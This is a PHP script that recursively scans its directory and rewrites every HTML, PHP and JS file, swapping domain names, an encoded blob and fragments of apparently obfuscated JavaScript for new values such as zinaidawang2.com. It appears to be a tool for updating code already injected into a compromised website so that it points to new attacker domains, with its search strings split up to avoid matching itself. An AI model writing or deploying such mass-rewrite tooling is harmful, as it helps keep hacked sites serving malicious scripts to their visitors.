<?php
#error_reporting(0);
ini_set('max_execution_time', 600);
ini_set('memory_limit', '-1');


function scan_dir($dirname){ 
	global $sobs, $coun, $replacement, $pattern, $repl; 
	$dir = opendir($dirname); 
	$coun_repl = 0;
	while (($file = readdir($dir)) !== false){ 
		if($file != '.' && $file != '..'){ 
			$temp1 = explode('.', $dirname . $sobs . $file);
			$extention = strtolower(array_pop($temp1));
			if(is_file($dirname . $sobs . $file) && ($extention == 'html' || $extention == 'php' || $extention == 'js')){ 
				$content = @file_get_contents($dirname . $sobs . $file);
				$content = @str_replace($pattern, $replacement, $content, $coun_repl);
				if ($coun_repl >= 1) {
					@file_put_contents($dirname . $sobs . $file, $content); 
					$repl +=1 ;
				}
				$coun = $coun + 1; 
			}
			if(is_dir($dirname . $sobs . $file)) 
				scan_dir($dirname . $sobs . $file); 
		} 
	} 
	closedir($dir); 
} 

$coun = 0;
$repl = 0;

$dir = dirname(__FILE__);
$replacement = array(
	'slesh+\'zinaidawang2\'+point',
	'var zona = "com";',
	'1Nva1IWXmZuW0M/hzOPI1Mt9ls2jopPH49Sa187Uig==',
	'galinawang2.com',
	'zinaidawang2.com',
	'belindawang2.com'
);
$pattern = array(
	'slesh'.'+\'zinaida\'+point',
	'var '.'zona = "wang";',
	'1Nva'.'1IWXmZuW0M/hzJrex9Kyl8uknpLW29ur',
	'gali'.'na.wang',
	'zinai'.'da.wang',
	'beli'.'nda.wang'
);

if (strpos(strtolower(php_uname()), 'win') === false) 
	$sobs = '/'; 
else 
	$sobs = '\\'; 

$a = $dir; 

if (substr($a, -1) == $sobs) 
	$a = substr($a, 0, strlen($a) - 1); 

scan_dir($a); 

echo 'Finish! Dir: '.$dir.' Replace: ' . $repl . ' Files: '. $coun; 
?>